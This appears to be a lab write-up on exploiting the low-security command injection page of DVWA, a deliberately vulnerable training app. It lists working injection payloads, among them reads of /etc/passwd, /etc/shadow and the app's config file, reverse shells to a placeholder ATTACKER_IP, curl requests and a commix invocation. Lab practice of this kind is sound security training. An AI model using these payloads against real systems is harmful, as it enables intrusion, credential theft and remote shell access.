# DVWA Command Injection — Low Security

## URL
http://127.0.0.1:4280/vulnerabilities/exec/

## Vulnerable Parameter
ip (POST parameter)

## Form Details
- Method: POST
- Input: "Enter an IP address" text field
- Executes `ping` command on server with user input
- Output displayed on page

## Source Code Behavior (Low)
- No input sanitization
- Command: `shell_exec('ping -c 4 ' . $target)` (Linux) or `shell_exec('ping ' . $target)` (Windows)
- Direct concatenation of user input into shell command

## Detection
1. Enter `127.0.0.1` — normal ping output
2. Enter `127.0.0.1; whoami` — ping output + username of web server user

## Working Payloads

### Command chaining operators
```
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
```

### System enumeration
```
127.0.0.1; cat /etc/passwd
127.0.0.1; uname -a
127.0.0.1; id
127.0.0.1; ls -la
127.0.0.1; ifconfig
```

### File read
```
127.0.0.1; cat /etc/shadow
127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php
```

### Reverse shell
```
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
127.0.0.1; nc -e /bin/bash ATTACKER_IP 4444
```

## Step-by-Step Exploitation
1. Enter `127.0.0.1` — confirms ping command works
2. Enter `127.0.0.1; whoami` — confirms command injection (shows www-data or similar)
3. Enter `127.0.0.1; cat /etc/passwd` — read system files
4. Enter `127.0.0.1; id` — check user privileges

## curl Commands
```bash
# Basic command injection
curl -X POST "http://127.0.0.1:4280/vulnerabilities/exec/" \
  -d "ip=127.0.0.1;whoami&Submit=Submit" \
  -b "PHPSESSID=<session>;security=low"

# Read /etc/passwd
curl -X POST "http://127.0.0.1:4280/vulnerabilities/exec/" \
  -d "ip=127.0.0.1;cat+/etc/passwd&Submit=Submit" \
  -b "PHPSESSID=<session>;security=low"
```

## commix Command
```bash
commix --url="http://127.0.0.1:4280/vulnerabilities/exec/" \
  --data="ip=127.0.0.1&Submit=Submit" \
  --cookie="PHPSESSID=<session>;security=low" \
  --batch
```

## Notes
- All shell metacharacters work: `;`, `&&`, `||`, `|`, backticks, `$()`
- No filtering whatsoever on input
- On Docker DVWA, the user is typically www-data
